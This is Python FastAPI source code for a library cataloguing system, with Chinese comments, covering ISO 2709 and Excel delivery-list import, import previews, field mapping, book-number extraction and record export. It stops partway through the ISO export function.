# -*- coding: utf-8 -*-
"""导入导出：ISO 2709 / 发货清单 Excel / 标准模板导出。"""
from __future__ import annotations

import json
import os
import tempfile
from collections.abc import Iterator
from contextlib import closing

from fastapi import APIRouter, Depends, File, Form, HTTPException, UploadFile
from pydantic import BaseModel
from sqlalchemy import func, literal, select
from sqlalchemy.exc import DataError, IntegrityError
from sqlalchemy.orm import Session
from starlette.background import BackgroundTask
from starlette.responses import FileResponse

from ..core import clean as cl
from ..core.marc import MarcWriteError, Record
from ..core.validators import LEVEL_ERROR, validate
from ..db import get_db
from ..models import CallNoCounter, HoldingORM, RecordORM
from ..services import record_to_orm_values
from ..io.excel import (missing_required, read_delivery_with_meta, row_extras,
                        row_to_draft_record)
from ..io.iso import parse_response_fields, read_iso
from ..core.route_meta import api

router = APIRouter(prefix="/import", tags=["import-export"])

# 单文件上限 256MB：3 万册 ISO 约 30MB，余量 8 倍。旧实现 file.read() 全量进内存
# 且解析后的 Record 列表再翻一倍驻留，一个超大的"上传"就能打爆单机内存。
MAX_UPLOAD_BYTES = 256 * 1024 * 1024


def read_upload(file: UploadFile) -> bytes:
    """读上传文件，超上限直接 413（ISO / Excel / 后台任务导入共用的唯一入口）。"""
    data = file.file.read(MAX_UPLOAD_BYTES + 1)
    if len(data) > MAX_UPLOAD_BYTES:
        raise HTTPException(
            413, f"文件超过大小上限（{MAX_UPLOAD_BYTES // (1024 * 1024)} MB），请分批导入")
    return data


def _save_records(db: Session, records: list[Record], source: str,
                  library_id: int | None = None,
                  barcode_start: str | None = None, force: bool = False) -> dict:
    from ..services.batch import import_records_to_db
    return import_records_to_db(db, records, source, library_id=library_id,
                                barcode_start=barcode_start, force=force)


def _barcode_start_or_400(start: str) -> str | None:
    """校验条码起始号（前缀 + 数字）；非法 → 400（不要让它到写库时才炸）。"""
    s = (start or "").strip()
    if not s:
        return None
    from ..services.batch import make_barcode_allocator
    try:
        make_barcode_allocator(s)
    except ValueError as e:
        raise HTTPException(400, str(e))
    return s


def _record_barcode(rec) -> str:
    """记录自带的第一个条码。口径与 `services/batch.py::_record_barcodes` 一致：
    **逐字段**先 `$h`（旧布局）再 `$b`（新布局），没有才看 995。

    逐字段而不是"整条记录二选一"：混合布局的文件里两种写法的 905 可以并存
    （已修正）。
    """
    for f in rec.get_fields("905"):
        v = (f.get("h") or f.get("b") or "").strip()
        if v:
            return v
    for f in rec.get_fields("995"):
        for code in ("f", "h", "a"):
            v = (f.get(code) or "").strip()
            if v:
                return v
    return ""


def _preview_verdicts(records, class_rule):
    """**预演**：按导入时同一套流程逐条判定，回答"导进去会发生什么"。

    为什么要在导入之前跑一遍：实际导入文件中可能有一部分记录会被质检拦下
    （如尺寸、年份填写不规范），用户导完才发现，只能回头逐条处理。
    预演把这件事提前到点击导入之前。

    必须复刻导入端的顺序 —— **清洗 → 截短分类号 → 质检 → 条码**：
    只跑 `validate()` 不跑清洗，会把 `606$a` 重复这类"清洗后自动消失"的问题
    也算成错误，结论可能完全相反。

    一次算两套口径，前端切换「资源库 / 图书库」时不必重新上传：
      - 图书库：质检错误或没有条码 → 跳过；
      - 资源库：原样入库（按 ISBN 去重），只统计"没有 ISBN"的条数，不拦。
    """
    from ..core import clean as cl
    from ..core.validators import LEVEL_ERROR, validate
    from ..services.batch import shorten_record_class_nos

    issues = []
    reasons = {}
    skip_catalog = 0
    no_isbn = 0

    def bump(key, label):
        item = reasons.setdefault(key, {"key": key, "label": label, "count": 0})
        item["count"] += 1

    for rec in records:
        cl.clean_record(rec, migrate_pinyin=True)
        shorten_record_class_nos(rec, class_rule)
        row_issues = []
        for f in validate(rec):
            if f.level != LEVEL_ERROR:
                continue
            row_issues.append(f.message)
            bump(f.rule_id or f.message, f.rule_name or f.message)
        if not row_issues and not _record_barcode(rec):
            row_issues.append("缺少条码")
            bump("no_barcode", "缺少条码")
        if row_issues:
            skip_catalog += 1
        if not (rec.first_value("010", "a") or "").strip():
            no_isbn += 1
        issues.append(row_issues)

    total = len(records)
    verdicts = {
        "records": {
            "target": "records", "total": total,
            "will_import": total - skip_catalog, "will_skip": skip_catalog,
            "reasons": sorted(reasons.values(), key=lambda x: -x["count"]),
        },
        "resource": {
            "target": "resource", "total": total,
            "will_import": total, "will_skip": 0, "no_isbn": no_isbn,
            "reasons": ([{"key": "no_isbn",
                          "label": "没有 ISBN（仍会入库，但不参与去重）",
                          "count": no_isbn}] if no_isbn else []),
        },
    }
    return verdicts, issues


@router.post("/iso/preview")
@api(module="io", level="read")
def preview_iso(file: UploadFile = File(...), limit: int = 10, page: int = 1,
                mapping: str = "", db: Session = Depends(get_db)):
    """**只解析、不落库**：条数、解析错误、逐条 MARC 字段、字段统计，外加**预演结论**。

    供导入界面「先看一眼再决定导到哪 / 要不要映射字段」用：

    - `records[].rows`：当前页记录的字段，**一行一个字段**（子字段同行横排）；
    - `records[].issues`：这条会被拦下的原因（空数组 = 能进）；
    - `verdicts.records` / `verdicts.resource`：两套落点各自的「将入库 / 将跳过」；
    - `field_stats`：全文件出现过的 `tag$code` 及次数，做字段映射的依据；
    - `suggested_mapping`：兼容字段表的自动关联建议（源 → 目标）。

    `mapping`（JSON 字符串，同导入接口）**必须参与预演**：不套映射时，书商文件
    （条码在 909）会被算成"全部缺条码"，结论完全反过来。不传则用系统建议。
    """
    from ..io.iso import (compat_field_options, iso_field_stats, parse_response_fields,
                          record_rows_json, suggest_mapping, target_field_options)
    from ..services.settings import class_no_rule

    data = read_upload(file)
    records, parse_errors = read_iso(data)
    if not records:
        raise HTTPException(400, "未解析到任何记录：" + str(parse_errors[:3]))

    stats = iso_field_stats(records)
    # `notes`：文件里有、但没被自动关联的源字段及**原因**。
    # "905 已经齐全"的文件会一条建议都没有，不解释的话用户以为功能坏了。
    mapping_notes: dict[str, str] = {}
    sug = suggest_mapping([s["key"] for s in stats], mapping_notes)
    target_keys = {t["key"] for t in target_field_options()}
    for s in stats:
        # 每个字段自带两种"已经对上"的信息，界面直接照着显示，不用自己推：
        #   - `known`：本来就是我们认得的字段（如 010$a / 210$d）→ 同名对应，无需映射
        #   - `suggested`：兼容字段的自动关联（如 909$a → 905$b）
        s["known"] = s["key"] in target_keys
        s["suggested"] = sug.get(s["key"], "")

    page_size = max(1, min(int(limit or 10), 50))
    page = max(1, int(page or 1))
    start = (page - 1) * page_size
    chunk = records[start:start + page_size]

    # 先把当前页的 MARC 字段拍下来（**映射之前**）。
    # 用户展开一行是想看"这个文件里到底有什么"，套完映射再显示，909 会凭空
    # 多出一条 905，看着像文件里本来就有 —— 那是两回事。摘要与预演才走映射。
    raw_rows = [record_rows_json(rec) for rec in chunk]

    fmap = _field_mapping_or_400(mapping) if (mapping or "").strip() else sug
    if fmap:
        # 注意用 `_apply_mapping_to_all`：`apply_field_mapping` 是**单条记录**的函数
        _apply_mapping_to_all(records, fmap)

    verdicts, issues = _preview_verdicts(records, class_no_rule(db))

    def brief(rec):
        return {
            "title": rec.first_value("200", "a") or "",
            "isbn": rec.first_value("010", "a") or "",
            "class_no": rec.first_value("690", "a") or "",
            "publisher": rec.first_value("210", "c") or "",
            "year": rec.first_value("210", "d") or "",
            "barcode": _record_barcode(rec),
        }

    with_barcode = sum(1 for r in records if _record_barcode(r))
    with_class = sum(1 for r in records if (r.first_value("690", "a") or "").strip())
    return {"total": len(records), **parse_response_fields(records, parse_errors),
            "with_barcode": with_barcode, "with_class_no": with_class,
            "page": page, "page_size": page_size,
            "applied_mapping": fmap or {},
            "verdicts": verdicts,
            # 兼容旧字段：`sample` 仍是"当前页的著录摘要"
            "sample": [brief(r) for r in chunk],
            # 逐条字段：**一行一个 MARC 字段**、子字段同行横排
            "records": [{"index": start + i + 1, **brief(r), "issues": issues[start + i],
                         "rows": raw_rows[i]}
                        for i, r in enumerate(chunk)],
            "field_stats": stats,
            "suggested_mapping": sug,
            "mapping_notes": mapping_notes,
            "target_fields": target_field_options(),
            "compat_fields": compat_field_options()}


def _field_mapping_or_400(raw: str | None) -> dict | None:
    """解析 ISO 字段映射（JSON 字符串 `{"源 tag$code": "目标 tag$code"}`）；非法 → 400。"""
    if not (raw or "").strip():
        return None
    try:
        mp = json.loads(raw)
        if not isinstance(mp, dict):
            raise ValueError
    except Exception:
        raise HTTPException(400, "mapping 必须是 JSON 对象（源 tag$code -> 目标 tag$code）")
    return {str(k): str(v) for k, v in mp.items()}


@router.post("/iso")
@api(module="io")
def import_iso(file: UploadFile = File(...), source: str = "import",
               target: str = "resource", library_id: int | None = None,
               barcode_start: str = "",
               force: bool = False, mapping: str = "",
               db: Session = Depends(get_db)):
    """导入 ISO 2709（同步；大文件请走 `POST /jobs/import-iso`）。

    `target` 决定落点（与发货清单路径同一口径）：
      - `resource`（默认）：写入套录资源库 —— 图书库只存编目校验好的记录；
        按 ISBN upsert 去重，`library_id` = **资源库** id（缺省「手工导入」）。
      - `records`：写入图书库 —— 每条都要有条码（记录自带 `905`/`995`，或由
        `barcode_start`〔前缀 + 数字，如 `A00000001`〕生成），缺条码的不入库；
        `library_id` = **图书库** id（缺省默认图书库）。`force=true` 放行质检 ERROR。

    `mapping`：**字段映射**（JSON 字符串，`{"源 tag$code": "目标 tag$code"}`，
    见 `/import/iso/preview` 的 `field_stats`）。用它把书商数据里我们不认的字段
    搬到我们的字段上，例如 `{"909$b": "905$f"}`。

    传了却不存在的 id 一律 **404**，不再静默落到默认库。
    """
    if target not in ("resource", "records"):
        raise HTTPException(400, "target 必须是 resource/records")

    # 先校验目标库再解析/写库：坏 id 应当在**动手之前**就 404，不留半截数据。
    if target == "records":
        from .book_libraries import resolve_library
        resolve_library(db, library_id)
    start = _barcode_start_or_400(barcode_start)
    fmap = _field_mapping_or_400(mapping)

    data = read_upload(file)
    records, parse_errors = read_iso(data)
    if not records:
        raise HTTPException(400, f"未解析到任何记录：{parse_errors[:3]}")

    mapped = _apply_mapping_to_all(records, fmap)
    # 解析错误**随结果一起回**：明细可截，计数/部分成功标志不可省。
    # 旧实现只回前 10 条且没有计数，坏掉的几十条静默消失。
    parse_fields = parse_response_fields(records, parse_errors)

    if target == "resource":
        from ..services.resource_cache import import_iso_records_to_library
        try:
            result = import_iso_records_to_library(db, records, library_id, source_tag=source)
        except ValueError as e:                  # 资源库不存在
            raise HTTPException(404, str(e))
        db.commit()
        result.update(parse_fields)
        if mapped:
            result["mapped"] = mapped
        return result

    result = _save_records(db, records, source=source, library_id=library_id,
                           barcode_start=start, force=force)
    result["target"] = "records"
    result.update(parse_fields)
    if mapped:
        result["mapped"] = mapped
    return result


def _apply_mapping_to_all(records: list[Record], fmap: dict | None) -> list[str]:
    """把字段映射套到整批记录上；返回**整批合计**的动作描述（文件级，不是逐条）。

    ⚠️ 用 `tally` 累加，**不要**去重收集逐条消息 —— 那样同一条消息被并成一条，
    而里面的数字是**首条记录**的，看起来像总数（实测导 150 册显示"9 处"，真值 450）。
    """
    if not fmap:
        return []
    from ..io.iso import apply_field_mapping, format_mapping_totals
    tally: dict = {}
    for rec in records:
        apply_field_mapping(rec, fmap, tally=tally)
    return format_mapping_totals(tally)


def _with_temp_xlsx(data: bytes, fn):
    """把上传的 xlsx 落到临时文件、交给 fn(path)、用完即删（Excel 解析的唯一落盘入口）。

    `fn` 抛 `ValueError`（如 `_load_rows` 的行数上限，见 io/excel.py）统一转 400：
    上限错误是**用户的输入问题**，不该以 500 形式暴露。
    """
    import os
    import tempfile
    fd, tmp_path = tempfile.mkstemp(suffix=".xlsx")
    with os.fdopen(fd, "wb") as f:
        f.write(data)
    try:
        return fn(tmp_path)
    except ValueError as e:
        raise HTTPException(400, str(e)) from e
    finally:
        os.unlink(tmp_path)


@router.post("/delivery-inspect")
@api(module="io", level="read")
def inspect_delivery_excel(file: UploadFile = File(...),
                           sheet: str | None = None, header_row: int | None = None):
    """读取发货清单的**表结构**（工作表 / 表头行 / 各列 + 自动识别的映射），
    供前端「手动选择映射」界面用。**不写库、不构造记录**。

    可传 `sheet` / `header_row` 反复预览（用户在界面上换表或改表头行时重取）。
    """
    from ..io.excel import inspect_delivery
    return _with_temp_xlsx(
        read_upload(file), lambda p: inspect_delivery(p, sheet=sheet, header_row=header_row))


def _import_delivery_to_resource(db: Session, rows, library_id: int | None) -> dict:
    """发货清单 → **资源库草稿**（原有行为；不强制任何字段）。"""
    from ..models import ResourceLibrary, ResourceRecordORM
    from ..services import compute_search_columns
    from ..services.resource_cache import _iso_bytes, upsert_resource_record

    if library_id:
        lib = db.get(ResourceLibrary, library_id)
        if lib is None:
            raise HTTPException(404, f"资源库不存在：{library_id}")
    else:
        lib = (db.query(ResourceLibrary)
               .filter(ResourceLibrary.name == "发货清单草稿").first())
        if lib is None:
            lib = ResourceLibrary(name="发货清单草稿", origin="发货清单生成的原始编目底稿")
            db.add(lib)
            db.flush()

    added = updated = skipped = 0
    for r in rows:
        if r.is_summary_row or not r.title:
            skipped += 1
            continue
        rec = row_to_draft_record(r)
        action = upsert_resource_record(db, rec, lib.id, source_tag="发货清单")
        if action == "inserted":
            added += 1
        elif action == "updated":
            updated += 1
        else:                       # 无 ISBN 的草稿仍入库
            cl.clean_record(rec, migrate_pinyin=True)
            cols = compute_search_columns(rec)
            db.add(ResourceRecordORM(library_id=lib.id, marc_raw=_iso_bytes(rec),
                                     leader=rec.leader,
                                     fields=json.loads(rec.to_json()),
                                     source_tag="发货清单", **cols))
            added += 1
    lib.record_count = (db.query(ResourceRecordORM)
                        .filter(ResourceRecordORM.library_id == lib.id).count())
    db.commit()
    return {"target": "resource", "library": lib.name, "library_id": lib.id,
            "imported": added, "updated": updated, "skipped": skipped,
            "record_count": lib.record_count, "errors": [], "error_count": 0}


def _import_delivery_to_records(db: Session, rows, library_id: int | None,
                                force: bool) -> dict:
    """发货清单 → **图书库**（直接入库）。

    与"资源库草稿"的关键差别：
      - **强制字段**按行校验（`missing_required()`：条码号 + 索书号〔分类号+书次号〕+
        正题名 + 出版者 + 出版年），缺任一项该行**不入库**、进 `errors`；
      - 行内建记录 + 建馆藏（条码、索书号、905 一并生成，走 `create_holdings` 同一套规则）；
      - 质检 ERROR 的行默认**拒绝**（`force=true` 才放行）—— 图书库只收校验好的记录。
    逐行用 SAVEPOINT 隔离：某行失败（条码重复 / 位数不合规…）不影响其余行。
    """
    from ..core.clc import shorten_record_class_nos
    from ..core.volume import derive_volume_seq
    from ..models import RecordORM
    from ..services.batch import create_holdings, validate_import_holding_values
    from ..services.settings import class_no_rule
    from .book_libraries import resolve_library

    lib = resolve_library(db, library_id)      # 图书库不存在 → 404（不静默落默认库）
    rule = class_no_rule(db)                   # 整批共用一条规则，循环里不重复查库
    imported = skipped = with_errors = 0
    errors: list[dict] = []
    forced: list[dict] = []                    # force 放行的行（带原因，单列出来）
    for r in rows:
        if r.is_summary_row:
            skipped += 1
            continue
        label = r.seq or r.title or r.isbn or "（无标号行）"
        missing = missing_required(r)
        if missing:
            # 这条**没有入库**，必须计入 skipped：否则界面「导入 40 行」、文件实际
            # 43 行，差的三条只沉在 errors 里，用户对不上账。
            skipped += 1
            errors.append({"row": label, "reason": "缺少必填项：" + "、".join(missing)})
            continue
        rec = row_to_draft_record(r)
        cl.clean_record(rec, migrate_pinyin=True)
        shorten_record_class_nos(rec, rule)
        bad = [f for f in validate(rec) if f.level == LEVEL_ERROR]
        if bad:
            with_errors += 1
            if not force:
                skipped += 1        # 同上：被质检拦下的行也没进库
                errors.append({"row": label,
                               "reason": "质检未通过：" + "；".join(f.message for f in bad[:3])})
                continue
        try:
            extras = row_extras(r)
            validate_import_holding_values(extras, [extras["barcode"]],
                                           (rec.first_value("690", "a") or "").strip())
            with db.begin_nested():            # 每行一个 SAVEPOINT：失败只废这一行
                values = record_to_orm_values(rec, source="发货清单")
                orm = RecordORM(**values, library_id=lib.id)
                db.add(orm)
                db.flush()
                orm.volume_seq = derive_volume_seq(extras["volume"])
                create_holdings(db, orm, 1, location=extras["location"],
                                barcodes=[extras["barcode"]], book_no=extras["book_no"],
                                volume=extras["volume"], shelf_no=extras["shelf_no"])
            imported += 1
            if bad:
                forced.append({"row": label, "reason": "；".join(f.message for f in bad[:3])})
        except (ValueError, MarcWriteError, DataError, IntegrityError) as e:
            errors.append({"row": label, "reason": str(e)})
    db.commit()
    # 操作日志：整批记**一行**，口径与 ISO 直落图书库一致。
    # 发货清单一次几百行，逐条 create 会把日志页刷屏；"这批谁导的"才是要问的。
    # 用 `clear_entries()`（原地清空）而非 discard+begin：本函数在路由的子 context
    # 里跑，`ContextVar.set()` 传不回中间件（见 core/oplog.begin 的说明）。
    from ..core import oplog
    oplog.clear_entries()
    if imported:
        oplog.append_bulk(oplog.ACTION_IMPORT, library_id=lib.id, count=imported,
                          note=f"来源：发货清单；共 {imported} 册")
    return {"target": "records", "library": lib.name, "library_id": lib.id,
            "imported": imported, "updated": 0, "skipped": skipped,
            "with_quality_errors": with_errors,
            "forced": forced[:20], "forced_count": len(forced),
            "errors": errors[:50], "error_count": len(errors)}


@router.post("/delivery-excel")
@api(module="io")
def import_delivery_excel(file: UploadFile = File(...), create: bool = False,
                          target: str = "resource", library_id: int | None = None,
                          force: bool = False,
                          sheet: str | None = None, header_row: int | None = None,
                          mapping: str | None = None,
                          db: Session = Depends(get_db)):
    """导入发货清单：预览清洗结果；create=true 时按 `target` 落库。

    - `target=resource`（默认）：草稿写入**资源库**（图书库只存编目校验好的记录）；
    - `target=records`：**直接进图书库** —— 每行必须满足强制字段（条码号 + 索书号
      〔分类号+书次号〕+ 正题名 + 出版者 + 出版年），并逐行建馆藏；质检 ERROR 的行
      默认拒绝（`force=true` 放行）。
    - `sheet` / `header_row`：指定工作表与表头行（不给 → 自动：选匹配列名最多的一行）；
    - `mapping`：**手动列映射**（JSON 字符串，`{"列下标": "字段key"}`，见 `/delivery-inspect`），
      给了就以它为准；不在注册表的字段值该列不导入。
    - `library_id`：**含义随 target 变** —— `resource` 时是资源库 id（缺省「发货清单草稿」），
      `records` 时是**图书库** id（缺省默认图书库）。传了不存在的 id → 404。
    """
    if target not in ("resource", "records"):
        raise HTTPException(400, "target 必须是 resource/records")

    mp = None
    if mapping:
        try:
            mp = json.loads(mapping)
            if not isinstance(mp, dict):
                raise ValueError
        except Exception:
            raise HTTPException(400, "mapping 必须是 JSON 对象（列下标 -> 字段名）")

    # 目标库先校验再解析：坏 id 应当在动手之前就 404，不留半截数据
    if create and target == "records":
        from .book_libraries import resolve_library
        resolve_library(db, library_id)

    rows, meta = _with_temp_xlsx(
        read_upload(file),
        lambda p: read_delivery_with_meta(p, sheet=sheet, header_row=header_row, mapping=mp))

    def row_json(r):
        return {"seq": r.seq, "isbn": r.isbn, "title": r.title, "subtitle": r.subtitle,
                "series": r.series, "publisher": r.publisher, "authors": r.authors,
                "role": r.role, "year": r.year, "cls_coarse": r.cls_coarse,
                "price": r.price, "qty": r.qty, "package": r.package,
                "class_no": r.class_no, "book_no": r.book_no, "volume": r.volume,
                "call_no": r.call_no, "barcode": r.barcode,
                "missing_required": missing_required(r),
                "warnings": r.warnings, "is_summary": r.is_summary_row}

    out = {"rows": [row_json(r) for r in rows],
           # 本次**实际读了哪张表、读了多少行**（回应用户"几千行只进了 1000 条"）
           "sheet": meta["sheet"], "sheets": meta["sheets"],
           "sheets_info": meta["sheets_info"], "read_rows": meta["data_rows"],
           "summary": {"total": len(rows),
                       "summary_rows": sum(1 for r in rows if r.is_summary_row),
                       "with_warnings": sum(1 for r in rows if r.warnings),
                       # 逐条告警汇总清单（前端可直接展示"哪里不对"）
                       "warnings": [w for r in rows for w in r.warnings]}}
    if create:
        if target == "records":
            out["created"] = _import_delivery_to_records(db, rows, library_id, force)
        else:
            out["created"] = _import_delivery_to_resource(db, rows, library_id)
    return out


# --------------------------------------------------------------------------
#  反向提取最大书次号（对标参考系统「提取清单最大号」，纯逻辑见 services/book_no_extract.py）
# --------------------------------------------------------------------------

class BookNoExtractIn(BaseModel):
    library_id: int
    text: str = ""
    dry_run: bool = True


def _book_no_extract_result(db: Session, library_id: int, lines: list[str],
                            dry_run: bool, meta: dict | None = None) -> dict:
    """提取 + （可选）抬号。JSON 入口与文件入口**共用这一份**，口径不会分叉。

    `dry_run=True` 时只算不写（前端先预览"哪个分类号会被抬到几"，确认了再落）。
    抬号只升不降：`_raise_seq` 用的是 `GREATEST(current, target)`，
    所以重复点、或者计数器本来就更高，都不会把号改小（改小会撞上已发出的号）。
    """
    from .book_libraries import resolve_library
    from ..core import oplog
    from ..services.batch import _raise_seq
    from ..services.book_no_extract import extract_max_book_no

    lib = resolve_library(db, library_id)
    rep = extract_max_book_no(lines)
    for it in rep["items"]:
        key = f"lib{lib.id}|{it['class_no']}"
        row = db.get(CallNoCounter, key)
        it["current"] = row.current_seq if row is not None else 0
        it["raised"] = it["max_no"] > it["current"]
    applied = [it for it in rep["items"] if it["raised"]]
    if not dry_run:
        for it in applied:
            _raise_seq(db, f"lib{lib.id}|{it['class_no']}", it["max_no"])
        db.commit()
        if applied:
            # 这是"改计数器"不是"改记录"，故记 ACTION_SETTINGS（见 core/oplog.py）。
            # 用 clear_entries()（原地清空）而非 discard+begin：本函数在路由的
            # 子 context 里跑，换绑对象父 context 看不到（见 core/oplog.begin 的说明）。
            oplog.clear_entries()
            oplog.append_bulk(
                oplog.ACTION_SETTINGS, library_id=lib.id, count=len(applied),
                note=f"提取最大书次号：抬高 {len(applied)} 个分类号的计数器"
                     f"（最高 {max(i['max_no'] for i in applied)}）")
    out = {"library_id": lib.id, "library": lib.name,
           "dry_run": bool(dry_run), "applied": len(applied), **rep}
    if meta:
        out["sheet"] = meta.get("sheet")
        out["sheets"] = meta.get("sheets")
        out["read_rows"] = meta.get("data_rows")
    return out


@router.post("/book-no-extract")
@api(module="io")
def book_no_extract(payload: BookNoExtractIn, db: Session = Depends(get_db)):
    """从**粘贴的索书号列表**反向提取最大书次号（`dry_run=true` 只预览、不落库）。"""
    from ..services.book_no_extract import lines_from_text
    lines = lines_from_text(payload.text)
    if not lines:
        raise HTTPException(400, "没有读到任何索书号：请每行一个，或从 Excel 整列复制粘贴")
    return _book_no_extract_result(db, payload.library_id, lines, payload.dry_run)


@router.post("/book-no-extract-file")
@api(module="io")
def book_no_extract_file(file: UploadFile = File(...),
                         library_id: int = Form(...),
                         dry_run: bool = Form(True),
                         sheet: str | None = Form(None),
                         db: Session = Depends(get_db)):
    """从**上传的清单**（.xlsx / .csv / .txt）反向提取最大书次号。

    Excel 只吃**索书号那一列**：表头命名为「索书号」即自动识别
    （`io/excel.py::DELIVERY_COLUMNS`），其余列原样忽略 ——
    **不要求"清单只留一列、列名必须叫索书号、中间不能有空行"**（参考系统那套约定我们不学，
    列名对不上时给的是"表头长什么样"的明确提示 + 粘贴框兜底，而不是静默处理 0 行）。
    `.csv` / `.txt` 按「每行一个索书号」读（逗号/分号分隔也认）。
    """
    from ..io.excel import inspect_delivery, read_delivery_with_meta
    from ..services.book_no_extract import lines_from_text

    data = read_upload(file)
    name = (file.filename or "").lower()
    if name.endswith((".csv", ".txt")):
        text = None
        for enc in ("utf-8-sig", "gb18030"):
            try:
                text = data.decode(enc)
                break
            except UnicodeDecodeError:
                continue
        if text is None:
            raise HTTPException(400, "无法识别文本编码（支持 UTF-8 / GBK）")
        lines = lines_from_text(text)
        if not lines:
            raise HTTPException(400, "文件里没有读到任何内容")
        return _book_no_extract_result(db, library_id, lines, dry_run)

    import os
    import tempfile
    fd, tmp = tempfile.mkstemp(suffix=".xlsx")
    with os.fdopen(fd, "wb") as f:
        f.write(data)
    try:
        rows, meta = read_delivery_with_meta(tmp, sheet=sheet)
        lines = [r.call_no for r in rows if (r.call_no or "").strip()]
        if not lines:
            cols = inspect_delivery(tmp, sheet=sheet)["columns"]
            names = "、".join(c["name"] for c in cols if c["name"]) or "（该表没有表头）"
            raise HTTPException(
                400, f"未找到索书号列，读到的表头：{names}。"
                     "请将该列表头改为「索书号」，或用下方粘贴框逐行粘贴。")
        return _book_no_extract_result(db, library_id, lines, dry_run, meta=meta)
    finally:
        os.unlink(tmp)


export_router = APIRouter(prefix="/export", tags=["import-export"])

class ExportIn(BaseModel):
    ids: list[int] = []
    encoding: str = "gbk"
    # ids 为空时按图书库**整库导出**（前端「导出整个图书库」用）。
    # 两者都给时以 ids 为准；都不给 → 400（不是静默导出一个空文件）。
    library_id: int | None = None
    # 导出格式预设 id（`settings.export_presets`，见 services/settings.py）。
    # ⚠️ **不给就是原样导出标准 CNMARC** —— 不套"默认预设"，否则给某一套设了默认
    # 就会悄悄改掉所有导出方（含 MCP 的 export_iso 工具）。
    preset_id: str | None = None


EXPORT_BATCH_SIZE = 256


def _export_scope(stmt, model, payload, library_name: str):
    """把「导出哪些记录」的条件加到 stmt 上。导出与"有没有排架号"共用同一份口径，
    否则会出现「预检说有、实际导出来是空列」这种对不上的情况。"""
    if payload.ids:
        return stmt.where(model.id.in_(payload.ids))
    if payload.library_id:
        return stmt.where(model.library_id == payload.library_id)
    raise HTTPException(400, f"请提供要导出的记录 id，或指定一个{library_name}")


def _iter_export_records(db: Session, model, payload, library_name: str) -> Iterator:
    """同一 SELECT 快照有界取数，必须在请求会话关闭前完成序列化。

    `shelf_no` 只有图书库记录有（资源库记录是纯书目，没有排架号这个概念），
    所以按模型有没有这个列决定要不要一起取。
    """
    cols = [model.id, model.leader, model.fields]
    if model is RecordORM:
        shelf = (select(HoldingORM.shelf_no)
                 .where(HoldingORM.record_id == RecordORM.id,
                        HoldingORM.shelf_no.isnot(None),
                        HoldingORM.shelf_no != "")
                 .order_by(HoldingORM.id).limit(1)
                 .correlate(RecordORM).scalar_subquery().label("shelf_no"))
        cols.append(shelf)
    stmt = _export_scope(select(*cols).order_by(model.id), model, payload, library_name)
    result = db.execute(stmt.execution_options(yield_per=EXPORT_BATCH_SIZE))
    try:
        yield from result
    finally:
        result.close()


#: 判断"这条记录的 905 里有没有 $c"。和取值时的兜底路径同一口径，
#: 否则会出现「预检说没有、列被丢掉，可实际有值」——那正是要避免的数据丢失。
_SHELF_IN_905 = '$[*] ? (@.tag == "905").sf[*] ? (@[0] == "c")'


def _has_shelf_no(db: Session, model, payload, library_name: str) -> bool:
    """本次导出里是否至少有一条记录带排架号。

    为什么要有这一步：没有排架号的数据（资源库、或没做排架管理的库）不该被塞一列
    空白。有排架号时一并导出。

    判据与取值严格对齐：记录列有值 **或** 905 里有 $c（老记录可能只有后者）。
    """
    if model is RecordORM:
        stmt = (select(HoldingORM.id)
                .join(RecordORM, RecordORM.id == HoldingORM.record_id)
                .where(HoldingORM.shelf_no.isnot(None), HoldingORM.shelf_no != ""))
        if payload.library_id:
            stmt = stmt.where(RecordORM.library_id == payload.library_id)
        if payload.ids:
            stmt = stmt.where(RecordORM.id.in_(payload.ids))
        if db.execute(stmt.limit(1)).first() is not None:
            return True
    stmt = select(literal(1)).select_from(model).where(
        func.jsonb_path_exists(model.fields, literal(_SHELF_IN_905)))
    stmt = _export_scope(stmt, model, payload, library_name)
    return db.execute(stmt.limit(1)).first() is not None


def _export_records(db: Session, payload: "ExportIn") -> Iterator:
    return _iter_export_records(db, RecordORM, payload, "图书库")


def _temporary_export(suffix: str, filename: str, media_type: str, writer) -> FileResponse:
    """先完成序列化才返回响应；失败/发送完毕都清理临时文件。"""
    fd, path = tempfile.mkstemp(suffix=suffix)
    os.close(fd)
    try:
        headers = writer(path)
        headers["Content-Disposition"] = f'attachment; filename="{filename}"'
        return FileResponse(path, media_type=media_type, headers=headers,
                            background=BackgroundTask(os.unlink, path))
    except BaseException:
        os.unlink(path)
        raise


# 标准导出模板列定义
EXPORT_COLUMNS: list[tuple[str, str, str]] = [
    # (列名, 字段tag, 子字段code)
    ("记录控制号", "001", ""),
    ("ISBN", "010", "a"), ("装帧", "010", "b"), ("定价", "010", "d"),
    ("题名", "200", "a"), ("副题名", "200", "e"), ("第一责任者", "200", "f"),
    ("其他责任者", "200", "g"), ("分卷号", "200", "h"), ("分卷名", "200", "i"),
    ("并列题名", "510", "a"), ("丛编名", "225", "a"),
    ("出版地", "210", "a"), ("出版社", "210", "c"), ("出版年", "210", "d"),
    ("版次", "205", "a"), ("页数", "215", "a"), ("图表", "215", "c"),
    ("尺寸", "215", "d"), ("附件", "215", "e"),
    ("语种", "101", "a"), ("分类号", "690", "a"),
    ("主题词", "606", "a"), ("提要", "330", "a"),
]


#: 排架号的**伪字段号**：它不是 MARC 子字段，而是记录列（905$c 只是它的投影）。
#: 用一个不可能与真字段冲突的标记，免得和 "905"/"c" 混在一起分不清来源。
SHELF_TAG = "@shelf_no"


def _export_columns(with_shelf: bool) -> list[tuple[str, str, str]]:
    """标准导出列 + （有排架号时）排架号。

    插在「分类号」后面：两者都是找书用的，放一起才顺手。
    """
    if not with_shelf:
        return EXPORT_COLUMNS
    cols = list(EXPORT_COLUMNS)
    at = next(i for i, c in enumerate(cols) if c[0] == "分类号") + 1
    cols.insert(at, ("排架号", SHELF_TAG, ""))
    return cols


@export_router.post("/iso")
@api(module="io")
def export_iso(payload: ExportIn, db: Session = Depends(get_db)):
    """按 id 批量导出 ISO 2709（默认 GBK，下游 ILS 兼容性最好）；
    不给 id 而给 `library_id` 时**整库导出**。

    给了 `preset_id` 时先按该**导出格式预设**补写一份兼容字段（见
    `io/iso.py::apply_export_mapping`）；不给 → 原样导出标准 CNMARC。
    """
    from ..core.marc import record_to_iso
    from ..io.iso import apply_export_mapping
    from ..services import orm_to_record
    from ..services.settings import export_preset_parts

    mapping, const = export_preset_parts(db, payload.preset_id)

    def write(path: str) -> dict:
        count = skipped = mapped = 0
        with open(path, "wb") as out, closing(_export_records(db, payload)) as rows:
            for orm in rows:
                try:
                    rec = orm_to_record(orm)
                    if mapping or const:
                        mapped += len(apply_export_mapping(rec, mapping, const))
